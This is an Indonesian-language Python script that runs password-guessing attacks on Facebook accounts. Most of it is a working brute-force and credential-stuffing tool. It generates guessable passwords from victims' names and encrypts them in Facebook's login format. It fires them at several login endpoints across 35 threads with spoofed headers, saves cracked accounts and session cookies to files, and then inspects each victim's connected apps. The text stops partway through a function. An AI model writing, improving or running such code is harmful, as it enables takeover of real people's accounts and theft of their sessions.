import os, sys, re, random, datetime, time, string
import requests, json, hashlib, uuid, subprocess
import base64
import struct
import datetime
import binascii

from time import sleep
import six.moves.urllib as urllib
from urllib.parse import quote_plus
from Cryptodome import Random
from Cryptodome.Cipher import AES
from nacl.public import PublicKey, SealedBox

from concurrent.futures import ThreadPoolExecutor as Purbasari
from bs4 import BeautifulSoup as beautifulsoup
from rich import print as sprint
from rich.panel import Panel
from rich.tree import Tree
from rich.progress import Progress, TextColumn
from rich.console import Console
from requests.auth import HTTPProxyAuth
from bs4 import BeautifulSoup as bs
user_link = []
user_chek = 0
user_okeh = 0
user_loop = 0
user_adrs = []
user_aplk = []
bsr = bs
user_aplk.append('y')
bulan_    = ['Januari', 'Februari', 'Maret', 'April',  'Mei', 'Juni', 'Juli','Agustus', 'September', 'Oktober', 'November', 'Desember']
waktu_    = datetime.datetime.now().month
yamete    = bulan_[waktu_-1]
agen      = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 YaBrowser/21.8.0.1716 Yowser/2.5 Safari/537.36'
session   = requests.Session()
#user_link.append('dihidev.id@gmail.com|khamdihi_XD')
#user_link.append('100085247361493|mas ryan')
#try:
#    p = ['http'][0]
 #   r = requests.get(f'https://api.proxyscrape.com/v2/?request=displayproxies&protocol={p}&timeout=10000&country=all&ssl=all&anonymity=all').text
 #   for y in r.splitlines():
 #       user_adrs.append(y)
#except:user_adrs.append('140.213.175.89:8080')
class Crack:

    def __init__(self):
        self.vs,self.lp,self.subz,self.apc = 5,1, ('┌───'), {}
        self.purbalingga = [
           '1','01','2','02','3','03'
        ]
        Tanggal, Bulan, Tahun = datetime.datetime.now().day,datetime.datetime.now().month,datetime.datetime.now().year
        ApaSihKa = '%s-%s-%s.txt'%(Tanggal,Bulan,Tahun)
        self.Save = f'[bold white]akun OK akan di simpan di file : OK/OK-{ApaSihKa}\nakun CP akan di simpan di file : CP/CP-{ApaSihKa}\nmode pesawat 3 detik jika tidak ada hasil setelah 500 id'
        self.Xyz()

    def Xyz(self):
        sprint(Panel('[bold white]01. Login Async Method\n02. Login Reguler Method\n03. Login Validate Method',
        subtitle=self.subz,subtitle_align='left',title='[bold plum2]• [bold white]Pilih Methode [bold plum2]•',style='bold plum2'))
        afah = Console().input('   [bold plum2]└──> ')
        while afah not in string.digits:
           afah = Console().input('   [bold red]└──> ')
        if afah in ('1','01'):self.apc.update({'Name':'A'})
        elif afah in ('2','02'):self.apc.update({'Name':'R'})
        elif afah in ('3','03'):self.apc.update({'Name':'V'})
        self.Psw()

    def Psw(self):
        global _shotgoun_, _defense_
        sprint(Panel('[bold white]01. Gunakan password manual\n02. Gunakan password default\n03. Gunakan password gabungan',
        subtitle=self.subz,subtitle_align='left',title='[bold plum2]• [bold white]Pilih Password [bold plum2]•', style='bold plum2'))
        afah = Console().input('   [bold plum2]└──> ')
        while afah not in str(self.purbalingga):
             afah = Console().input('   [bold red]└──> ')
        if afah in ('1','01','manual'):
           tampung_dulu = []
           sprint(Panel('[bold white]Masukan kata sandi manual. pastikan kata sandi lebih dari 5 karakter', 
           subtitle=self.subz,subtitle_align='left',style='bold plum2'))
           kata_sandi = Console().input('   [bold plum2]└──> ').split(',')
           for khamdihi in kata_sandi:
               if len(khamdihi) <=5:
                  pass
               else:tampung_dulu.append(khamdihi)
           if len(tampung_dulu) == 0:
               exit(sprint(Panel('[bold red]Kata sandi tidak ada, kemungkinan sandi anda kurang dari 5 karakter',style='bold plum2')))
           sprint(Panel(self.Save,style='bold plum2'))
           _shotgoun_ = Progress(TextColumn('{task.description}'))
           _defense_ = _shotgoun_.add_task('', total=len(user_link))
           with _shotgoun_:
              with Purbasari(max_workers=35) as krjmbu:
                for _i_ in user_link:
                   user_id,user_nm = _i_.split('|')
                   if self.apc['Name'] == 'R':
                      krjmbu.submit(self.Reguler, user_id, tampung_dulu)
                   elif self.apc['Name'] == 'V':
                      krjmbu.submit(self.Validate, user_id, tampung_dulu)
                   else:
                      krjmbu.submit(self.Async, user_id, tampung_dulu)
           self.keterangan(user_okeh,user_chek)
           quit(1)

        elif afah in ('2','02','default'):
           sprint(Panel(self.Save,style='bold plum2'))
           _shotgoun_ = Progress(TextColumn('{task.description}'))
           _defense_ = _shotgoun_.add_task('', total=len(user_link))
           with _shotgoun_:
              with Purbasari(max_workers=35) as krjmbu:
                for _i_ in user_link:
                   user_id,user_nm = _i_.split('|')
                   password_defaul = self.Oto(user_nm)
                   if self.apc['Name'] == 'R':
                      krjmbu.submit(self.Reguler, user_id, password_defaul)
                   elif self.apc['Name'] == 'V':
                      krjmbu.submit(self.Validate, user_id, password_defaul)
                   else:
                      krjmbu.submit(self.secure, user_id, password_defaul)
           self.keterangan(user_okeh,user_chek)
           quit(1)
        elif afah in ('3','03','gabungan'):
           tampung_dulu = []
           sprint(Panel('[bold white]Masukan kata sandi manual. pastikan kata sandi lebih dari 5 karakter',
           subtitle=self.subz,subtitle_align='left',style='bold plum2'))
           kata_sandi = Console().input('   [bold plum2]└──> ').split(',')
           for khamdihi in kata_sandi:
               if len(khamdihi) <=5:
                  pass
               else:tampung_dulu.append(khamdihi)
           if len(tampung_dulu) == 0:
               exit(sprint(Panel('[bold red]Kata sandi tidak ada, kemungkinan sandi anda kurang dari 5 karakter',style='bold plum2')))
           sprint(Panel(self.Save,style='bold plum2'))
           _shotgoun_ = Progress(TextColumn('{task.description}'))
           _defense_ = _shotgoun_.add_task('', total=len(user_link))
           with _shotgoun_:
              with Purbasari(max_workers=35) as krjmbu:
                for _i_ in user_link:
                   user_id,user_nm = _i_.split('|')
                   password_gabung = self.Gab(user_nm,tampung_dulu)
                   if self.apc['Name'] == 'R':
                      krjmbu.submit(self.Reguler, user_id, password_gabung)
                   elif self.apc['Name'] == 'V':
                      krjmbu.submit(self.Validate, user_id, password_gabung)
                   else:
                      krjmbu.submit(self.Async, user_id, password_gabung)
           self.keterangan(user_okeh,user_chek)
           quit(1)

    def keterangan(self, Ok, Cp):
        if int(Ok) == 0 and int(Cp) == 0:
           exit(sprint(Panel('[bold white]Ops sory, kamu tidak mendapatkan hasil apapun, silakan coba lagi', style='bold plum2')))
        else:
           if int(Ok) >= 3:
              exit(sprint(Panel(f'[bold green]Selamat kamu mendapatkan akun OK lebih dari 2/3. total akun OK : {Ok} dan total akun CP : {Cp}', style='bold plum2')))
           else:
              exit(sprint(Panel(f'[bold green]Selamat kamu mendapatkan akun OK: {Ok} dan CP : {Cp}', style='bold plum2')))

    def Oto(self, namane):
        xyz = []
        for x in namane.split(' '):
           if len(x) == 1 or len(x) == 2:
              continue
           if len(namane) <=5:
              if len(x) <3:
                continue
              else:
                xyz.append(x + '123')
                xyz.append(x + '1234')
                xyz.append(x + '12345')

                xyz.append(x.lower() + '123')
                xyz.append(x.lower() + '1234')
                xyz.append(x.lower() + '12345')
           else:
              xyz.append(x + '123')
              xyz.append(x + '1234')
              xyz.append(x + '12345')

              xyz.append(namane)
              xyz.append(namane.lower())

              xyz.append(x.lower() + '123')
              xyz.append(x.lower() + '1234')
              xyz.append(x.lower() + '12345')
        return xyz

    def Gab(self, namane, Tambahan):
        xyz = []
        for x in namane.split(' '):
           if len(x) == 1 or len(x) == 2:
              continue
           if len(namane) <=5:
              if len(x) <3:
                continue
              else:
                xyz.append(x + '123')
                xyz.append(x + '1234')
                xyz.append(x + '12345')

                xyz.append(x.lower() + '123')
                xyz.append(x.lower() + '1234')
                xyz.append(x.lower() + '12345')
           else:
              xyz.append(x + '123')
              xyz.append(x + '1234')
              xyz.append(x + '12345')

              xyz.append(namane)
              xyz.append(namane.lower())

              xyz.append(x.lower() + '123')
              xyz.append(x.lower() + '1234')
              xyz.append(x.lower() + '12345')
        for _r_ in Tambahan:
            if _r_ not in xyz:
               xyz.append(_r_)
            else:pass
        return xyz

    def Enc_Psw(self,Digit, PublikIDFromMeta, Pswd, khamdihiDEV):
        if khamdihiDEV == 'facebook':versions = 5
        else:versions = 10
        yxz = Random.get_random_bytes(32)
        noc = bytes([0] * 12)
        stm = int(datetime.datetime.now().timestamp())
        xxx = AES.new(yxz, AES.MODE_GCM, nonce=noc, mac_len=16)
        xxx.update(str(stm).encode('utf-8'))
        enc_password, cipher_tag = xxx.encrypt_and_digest(Pswd.encode('utf-8'))
        PublikId = binascii.unhexlify(PublikIDFromMeta)
        SsialBoy = SealedBox(PublicKey(PublikId))
        enc__yxz = SsialBoy.encrypt(yxz)
        khamdihi = bytes([1,Digit,*list(struct.pack('<h', len(enc__yxz))),*list(enc__yxz),*list(cipher_tag),*list(enc_password)])
        khamdihi = base64.b64encode(khamdihi).decode('utf-8')
        if 'facebook' in khamdihiDEV:
            return (f'#PWD_BROWSER:{versions}:{stm}:{khamdihi}')
        else:
            return (f'#PWD_INSTAGRAM_BROWSER:{versions}:{stm}:{khamdihi}')

    def save(self,id,pw,status):
        Tanggal, Bulan, Tahun = datetime.datetime.now().day,datetime.datetime.now().month,datetime.datetime.now().year
        ApaSihKa = '%s-%s-%s.txt'%(Tanggal,Bulan,Tahun)
        if status == True:
           with open(f"OK/OK-{ApaSihKa}", mode="a") as xyz:
             xyz.write('%s|%s\n'%(id,pw))
             xyz.close()
        else:
           with open(f"CP/CP-{ApaSihKa}", mode="a") as xyz:
             xyz.write('%s|%s\n'%(id,pw))
             xyz.close()

    def enc_pass(self):
        try:
            ses = requests.Session()
            url = ses.get('https://web.facebook.com/?_rdc=1&_rdr').text
            items = re.findall('\"publicKey\":\"(.*?)\",\"keyId\":(\d+)', str(url))
            for publikid, keyid in items:
                apcb,digit = publikid,keyid
        except:
             apcb,digit = "fb95f376311d29bf2cbe1c5db235f38d6f58b6101b039dfeab86ce5aad8a3e1a","119"
        return apcb,digit

    def cokiez(self,resp):
        try:
            y = re.findall('"_js_datr","(.*?)"', str(resp))[0]
        except:
            y = 'YxSTZEfYahGZylsX2fM5F2Ur'
        return y

    def secure(self, user, listpw):
        global user_okeh, user_chek, user_loop
        _shotgoun_.update(_defense_,description=f' • Looping: {user_loop} Ok:{user_okeh} Cp:{user_chek} Count: {len(user_link)}')
        _shotgoun_.advance(_defense_)
        for psw in listpw:
            try:
                session = requests.Session()
                item_gt = session.get('https://secure.facebook.com/').text
                self.co = {'_js_datr': self.cokiez(item_gt)}
                headers = {
                   'Host': 'secure.facebook.com',
                   'cache-control': 'max-age=0',
                   'upgrade-insecure-requests': '1',
                   'origin': 'https://secure.facebook.com',
                   'content-type': 'application/x-www-form-urlencoded',
                   'user-agent': 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9320; fr) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.398 Mobile Safari/534.11+',
                   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                   'x-requested-with': 'mark.via.gp',
                   'sec-fetch-site': 'same-origin',
                   'sec-fetch-mode': 'navigate',
                   'sec-fetch-user': '?1',
                   'sec-fetch-dest': 'document',
                   'referer': 'https://secure.facebook.com/',
                   'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                }
                url_xz = str({"type":0,"creation_time":int(time.time()),"callsite_id":381229079575946}).encode()
                params = {'privacy_mutation_token': base64.b64encode(url_xz).decode()}
                data = {
                   'jazoest': re.search('name="jazoest" value="(.*?)"', str(item_gt)).group(1),
                   'lsd': re.search('name="lsd" value="(.*?)"', str(item_gt)).group(1),
                   'email': user,
                   'login_source': 'comet_headerless_login',
                   'next': '',
                   'pass':psw
                }
                urlencod = urllib.parse.urlencode(data,doseq=True)
                response = session.post('https://secure.facebook.com/login/', params=params, cookies={'cookie':cookies} ,headers=headers, data=urlencod, allow_redirects=False)
                if 'checkpoint' in session.cookies.get_dict():
                    user_chek +=1
                    _nunu_ = Tree('\r    ',style='bold yellow')
                    _nunu_.add(f'{user}|{psw}')
                    _nunu_.add(headers['user-agent'])
                    _nunu_.add(urlencod)
                    sprint(_nunu_)
                    self.save(user,psw,False)
                    break

                elif 'c_user' in session.cookies.get_dict():
                    user_okeh +=1
                    xyz_cons = (';').join(['%s=%s'%(apcb,yxzp) for apcb,yxzp in session.cookies.get_dict().items()])
                    _nunu_ = Tree('\r    ',style='bold green')
                    _nunu_.add(f'{user}|{psw}')
                    _nunu_.add(xyz_cons)
                    _nunu_.add(headers['user-agent'])
                    sprint(_nunu_)
                    self.save(user,psw,True)
                    break
            except Exception as e:print(e)
        user_loop +=1

    def WebLog(self, user, listpw):
        global user_okeh, user_chek, user_loop
        _shotgoun_.update(_defense_,description=f' • Looping: {user_loop} Ok:{user_okeh} Cp:{user_chek} Count: {len(user_link)}')
        _shotgoun_.advance(_defense_)
        for psw in listpw:
            try:
                publik_,_digits_ = self.enc_pass()
                ses = requests.Session()
                uaz = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.32 (KHTML, like Gecko) Chromium/25.0.1349.2 Chrome/25.0.1349.2 Safari/537.32 Epiphany/3.8.2'
                url = ses.get('https://web.facebook.com/?_rdc=1&_rdr').text
                enc = self.Enc_Psw(int(_digits_), str(publik_), psw, 'facebook')
                data = {
                   'jazoest':re.search('name="jazoest" value="(.*?)"', str(url)).group(1),
                   'lsd':re.search('name="lsd" value="(.*?)"', str(url)).group(1),
                   'email':user,
                   'login_source':'comet_headerless_login',
                   'next':'',
                   'encpass':enc
                }
                coki = (';').join(['%s=%s'%(key,value) for key,value in ses.cookies.get_dict().items()])
                face = {
                   'Host': 'web.facebook.com',
                   'content-length': '298',
                   'cache-control': 'max-age=0',
                   'viewport-width': '980',
                   'sec-ch-ua-platform': '"Linux"',
                   'sec-ch-ua-platform-version': '""',
                   'upgrade-insecure-requests': '1',
                   'origin': 'https://web.facebook.com',
                   'content-type': 'application/x-www-form-urlencoded',
                   'user-agent': uaz,
                   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                   'sec-fetch-site': 'same-origin',
                   'sec-fetch-mode': 'navigate',
                   'sec-fetch-dest': 'document',
                   'referer': 'https://web.facebook.com/?_rdc=1&_rdr',
                   'accept-encoding': 'gzip, deflate, br',
                   'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5',
                   'cookie':'{};_js_datr={}'.format(coki,re.search('"_js_datr","(.*?)"', str(url)).group(1))
                }
                repn = ses.post('https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjg2OTEzMTc2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D',data=data, headers=face, allow_redirects=False)
                if 'checkpoint' in ses.cookies.get_dict():
                    user_chek +=1
                    _nunu_ = Tree('\r    ',style='bold yellow')
                    _nunu_.add(f'{user}|{psw}')
                    _nunu_.add(face['user-agent'])
                    _nunu_.add(data['encpass'])
                    sprint(_nunu_)
                    self.save(user,psw,False)
                    break

                elif 'c_user' in ses.cookies.get_dict():
                    user_okeh +=1
                    xyz_cons = (';').join(['%s=%s'%(apcb,yxzp) for apcb,yxzp in ses.cookies.get_dict().items()])
                    _nunu_ = Tree('\r    ',style='bold green')
                    _nunu_.add(f'{user}|{psw}')
                    _nunu_.add(xyz_cons)
                    _nunu_.add(data['encpass'])
                    sprint(_nunu_)
                    self.save(user,psw,True)
                    break
            except Exception as e:print(e)
        user_loop +=1

    def Async(self, user, listpw):
        global user_okeh, user_chek, user_loop
        _shotgoun_.update(_defense_,description=f' • Looping: {user_loop} Ok:{user_okeh} Cp:{user_chek} Count: {len(user_link)}')
        _shotgoun_.advance(_defense_)
        for psw in listpw:
            try:
                ses = requests.Session()
                headers_r = {
                   'Accept-Language': 'en-US,en;q=0.8',
                   'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15',
                   'Referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
                   'Connection': 'keep-alive',
                   'upgrade-insecure-requests': '1',
                }
                response = ses.get('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',headers=headers_r).text
                payloads = {
                   'm_ts':re.search('name="m_ts" value="(.*?)"',str(response)).group(1),
                   'li':re.search('name="li" value="(.*?)"',str(response)).group(1),
                   'try_number':'0',
                   'unrecognized_tries':'0',
                   'email':user,
                   'prefill_contact_point':user,
                   'encpass':self.Enc_Psw(119,"fb95f376311d29bf2cbe1c5db235f38d6f58b6101b039dfeab86ce5aad8a3e1a",psw,'facebook'),
                   'prefill_source':'provided_or_soft_matched',
                   'prefill_type':'contact_point',
                   'first_prefill_source':'browser_dropdown',
                   'first_prefill_type':'contact_point',
                   'had_cp_prefilled':'true',
                   'had_password_prefilled':'true',
                   'is_smart_lock':'false',
                   'bi_xrwh':'0',
                   'jazoest':re.search('name="jazoest" value="(.*?)"',str(response)).group(1),
                   'lsd':re.search('name="lsd" value="(.*?)"',str(response)).group(1)
               }
                headers_r.pop("User-Agent",None)
                try:kaway=random.choice(open('UaBb.txt','r').read().splitlines())
                except:kaway='Mozilla/5.0 (BlackBerry; U; BlackBerry 9320; fr) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.398 Mobile Safari/534.11+'
                headers_r.update({"User-Agent":kaway})
                content_ = len(str('&').join(['%s=%s'%(name,value) for name,value in payloads.items()]))
                headers_r.update({'content-length': f'{content_}','cookie': (';').join(['%s=%s'%(apcb,yxzp) for apcb,yxzp in ses.cookies.get_dict().items()])})
                responsz = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', headers=headers_r, data=payloads, allow_redirects=True)
                if 'checkpoint' in ses.cookies.get_dict():
                    user_chek +=1
                    _nunu_ = Tree('\r    ',style='bold yellow')
                    _nunu_.add(f'{user}|{psw}')
                    _nunu_.add(headers_r['User-Agent'])
                    _nunu_.add(payloads['encpass'])
                    sprint(_nunu_)
                    self.save(user,psw,False)
                    break

                elif 'c_user' in ses.cookies.get_dict():
                    user_okeh +=1
                    xyz_cons = (';').join(['%s=%s'%(apcb,yxzp) for apcb,yxzp in ses.cookies.get_dict().items()])
                    _nunu_ = Tree('\r    ',style='bold green')
                    _nunu_.add(f'{user}|{psw}')
                    _nunu_.add(xyz_cons)
                    _nunu_.add(payloads['encpass'])
                    sprint(_nunu_)
                    self.save(user,psw,True)
                    break
#            except Exception as e:print(e)
            except requests.exceptions.ConnectionError:time.sleep(30)
        user_loop +=1

    def Validate(self, user, listpw):
        global user_okeh, user_chek, user_loop
        _shotgoun_.update(_defense_,description=f' • Looping: {user_loop} Ok:{user_okeh} Cp:{user_chek} Count: {len(user_link)}')
        _shotgoun_.advance(_defense_)
        for psw in listpw:
            try:
                ses = requests.Session()
                key = "fb95f376311d29bf2cbe1c5db235f38d6f58b6101b039dfeab86ce5aad8a3e1a"
                proxies = {'http': 'http://{}'.format(random.choice(user_adrs))}
                auth_pr = HTTPProxyAuth(user,psw)
                resp = ses.get(f'https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&locale=en_GB')
                data = {'lsd': re.search('name="lsd" value="(.*?)"', str(resp.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"', str(resp.text)).group(1),'uid': user,'next': 'https://m.facebook.com/login/save-device/','flow':'login_no_pin','encpass':self.Enc_Psw(119,key,psw,'facebook')}
                len_c = str(len(('&').join([key+'='+value for key,value in data.items()])))
                cokie = (';').join([key+'='+value for key,value in ses.cookies.get_dict().items()])
                kaway = 'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179'
#'Mozilla/5.0 (Linux; Android 8.1.0; BBF100-2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36'
                head = {'Host': 'm.facebook.com','content-length': f'{int(len_c)}','cache-control': 'max-age=0','viewport-width': '980','sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"8.1.0"','sec-ch-ua-full-version-list': '"Google Chrome";v="113.0.5672.162", "Chromium";v="113.0.5672.162", "Not-A.Brand";v="24.0.0.0"','sec-ch-prefers-color-scheme': 'light','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': kaway,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': f'https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&locale=en_GB','accept-encoding': 'br','accept-language': 'en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5','cookie': cokie}
                respon = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&is_from_native_app=true&locale2=en_GB', auth=auth_pr, proxies=proxies, data=data, headers=head, allow_redirects=False)
                if 'checkpoint' in ses.cookies.get_dict():
                    user_chek +=1
                    _nunu_ = Tree('\r    ',style='bold yellow')
                    _nunu_.add(f'{user}|{psw}')
                    _nunu_.add(head['user-agent'])
                    _nunu_.add(data['encpass'])
                    sprint(_nunu_)
                    self.save(user,psw,False)
                    break

                elif 'c_user' in ses.cookies.get_dict():
                    user_okeh +=1
                    xyz_cons = (';').join(['%s=%s'%(apcb,yxzp) for apcb,yxzp in ses.cookies.get_dict().items()])
                    _nunu_ = Tree('\r    ',style='bold green')
                    _nunu_.add(f'{user}|{psw}')
                    _nunu_.add(xyz_cons)
                    _nunu_.add(data['encpass'])
                    sprint(_nunu_)
                    self.save(user,psw,True)
                    break
            except Exception as e:print(e)
            except requests.exceptions.ConnectionError:time.sleep(30)
        user_loop +=1

    def Reguler(self, user, listpw):
        global user_okeh, user_chek, user_loop, user_aplk
        _shotgoun_.update(_defense_,description=f' • Looping: {user_loop} Ok:{user_okeh} Cp:{user_chek} Count: {len(user_link)}')
        _shotgoun_.advance(_defense_)

        pika = requests.Session()
        xxx  = {'Cookie': f'datr=LPBtZNKhqyX91-579SQkUH7c;sb=LPBtZBV_9Re-I8IKManmLqB9;vpd=v1%3B630x360x2;locale=id_ID;dpr=2;wl_cbv=v2%3Bclient_version%3A2268%3Btimestamp%3A{str(time.time())[:10]};wd=980x1715;fr=0JLoOCCWQjU3E56fq.AWVdJD301PDu88Ys4NsdGz1wcQg.BkcgVh.Ws.AAA.0.0.Bkf_Z6.AWVriuXhM6E'}
        yxz  = {
              'User-Agent': 'Mozilla/5.0 (Linux; Android 9; PDBM00 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/11.18 SP-engine/2.14.0 baiduboxapp/11.18.0.12 (Baidu; P1 9)',
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
        }
        r = pika.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', cookies=xxx, headers=yxz)
        for psw in listpw:
            try:
                Payloads = {
                  'lsd':re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                  'jazoest':re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                  'm_ts':re.search('name="m_ts" value="(.*?)"', str(r.text)).group(1),
                  'li':re.search('name="li" value="(.*?)"', str(r.text)).group(1),
                  'try_number':re.search('name="try_number" value="(.*?)"', str(r.text)).group(1),
                  'unrecognized_tries':re.search('name="unrecognized_tries" value="(.*?)"', str(r.text)).group(1),
                  'email':user,
                  'encpass':self.Enc_Psw(119,'fb95f376311d29bf2cbe1c5db235f38d6f58b6101b039dfeab86ce5aad8a3e1a',psw,'facebook'),
                  'login':'Masuk',
                  'bi_xrwh':re.search('name="bi_xrwh" value="(.*?)"', str(r.text)).group(1)
                }
                contens = len(str('&').join(['%s=%s'%(name,value) for name,value in Payloads.items()]))
                try:nokiabb=random.choice(open('UaBb.txt','r').read().splitlines())
                except:nokiabb='BlackBerry8100/4.2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/1'
                Headers = {
                  'Host': 'mbasic.facebook.com',
                  'content-length': f'{contens}',
                  'cache-control': 'max-age=0',
                  'viewport-width': '980',
                  'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                  'sec-ch-ua-mobile': '?1',
                  'sec-ch-ua-platform': '"Android"',
                  'sec-ch-ua-platform-version': '"8.1.0"',
                  'sec-ch-ua-full-version-list': '"Google Chrome";v="113.0.5672.162", "Chromium";v="113.0.5672.162", "Not-A.Brand";v="24.0.0.0"',
                  'sec-ch-prefers-color-scheme': 'light',
                  'upgrade-insecure-requests': '1',
                  'origin': 'https://mbasic.facebook.com',
                  'content-type': 'application/x-www-form-urlencoded',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MITO_A37_Z1plus Build/O21019; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30. 113;]',
                  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                  'sec-fetch-site': 'same-origin',
                  'sec-fetch-mode': 'navigate',
                  'sec-fetch-user': '?1',
                  'sec-fetch-dest': 'document',
                  'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
                  'accept-encoding': 'gzip, deflate, br',
                  'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5',
                  'cookie': (';').join(['%s=%s'%(apcb,yxzp) for apcb,yxzp in pika.cookies.get_dict().items()])
                }
                respons = pika.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=Payloads, headers=Headers, allow_redirects=False)
                if 'checkpoint' in pika.cookies.get_dict():
                    user_chek +=1
                    _nunu_ = Tree('\r    ',style='bold yellow')
                    _nunu_.add(f'{user}|{psw}')
                    _nunu_.add(Headers['user-agent'])
                    _nunu_.add(Payloads['encpass'])
                    sprint(_nunu_)
                    self.save(user,psw,False)
                    opsi(user,[psw])
                    break
                elif 'c_user' in pika.cookies.get_dict():
                    user_okeh +=1
                    xyz_cons = (';').join(['%s=%s'%(apcb,yxzp) for apcb,yxzp in pika.cookies.get_dict().items()])
                    _nunu_ = Tree('\r    ',style='bold green')
                    _nunu_.add(f'{user}|{psw}')
                    _nunu_.add(xyz_cons)
                    _nunu_.add(Payloads['encpass'])
                    sprint(_nunu_)
                    self.save(user,psw,True)
                    if 'y' in user_aplk:
                        Aplikasi(xyz_cons)
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:time.sleep(30)
        user_loop +=1

class Aplikasi:

    def __init__(self,kuki):
        self.kuki = {'cookie': kuki}
        self.data,self.apk_av,self.apk_ev,self.yz = {}, [], [], []
        self.live, self.chek = 0, 0
        self.Urut()

    def Urut(self):
        self.YangAktif()
        self.YangExp()

    def tam(self, apk_ak):
        self.ikh = Tree(f'• active application: {len(self.apk_av)}',style='bold plum2')
        for y in apk_ak:
            self.ikh.add('%s'%(y))
        sprint(self.ikh)

    def tam_(self, apk_ex):
        self.ikh = Tree(f'\n• expired application: {len(self.apk_ev)}',style='bold plum2')
        for y in apk_ex:
            self.ikh.add('%s'%(y))
        sprint(self.ikh)

    def YangAktif(self):
        try:
            rrq = requests.Session().get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies=self.kuki)
            ser = bs(rrq.text,'html.parser')
            tit = re.findall('<title>(.*?)</title>', str(rrq.text))
            if 'Diakses menggunakan Facebook' in tit:
               for me in ser.find_all('h3'):
                  if 'Ditambahkan' in me.text:
                     self.live +=1
                     self.apk_av.append(f"{self.live}. {me.text.replace('Ditambahkan',' Ditambahkan')}")
                  else:continue
               self.tam(self.apk_av)
            elif 'Gunakan mode dasar' in tit:
               try:
                   for mode in ser.find_all('a', href=True):
                       if 'Tidak, Terima Kasih' in mode.text:
                          mmk = requests.get('https://mbasic.facebook.com'+mode['href'],cookies=self.kuki)
                          asu = bs(mmk.text,'html.parser')
                          self.data.update({
                             "fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"',str(mmk.text)).group(1),
                             "jazoest":re.search('name="jazoest" value="(.*?)"',str(mmk.text)).group(1),
                             "submit":"OK, Gunakan Data"})
                          xxx = asu.find('form', method='post')['action']
                          spn = requests.post('https://mbasic.facebook.com'+xxx,cookies=self.kuki,data=self.data).text
                          self.YangAktif()
               except Exception as e:pass
            else:pass
        except Exception as e:pass

    def YangExp(self):
        try:
            rrq = requests.Session().get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=self.kuki)
            ser = bs(rrq.text,'html.parser')
            tit = re.findall('<title>(.*?)</title>', str(rrq.text))
            if 'Diakses menggunakan Facebook' in tit:
               for me in ser.find_all('h3'):
                   if 'Kedaluwarsa' in me.text:
                       self.chek +=1
                       self.apk_ev.append(f"{self.chek}. {me.text.replace('Kedaluwarsa',' Kedaluwarsa')}")
                   else:continue
               self.tam_(self.apk_ev)
            elif 'Gunakan mode dasar' in tit:
               try:
                   for mode in ser.find_all('a', href=True):
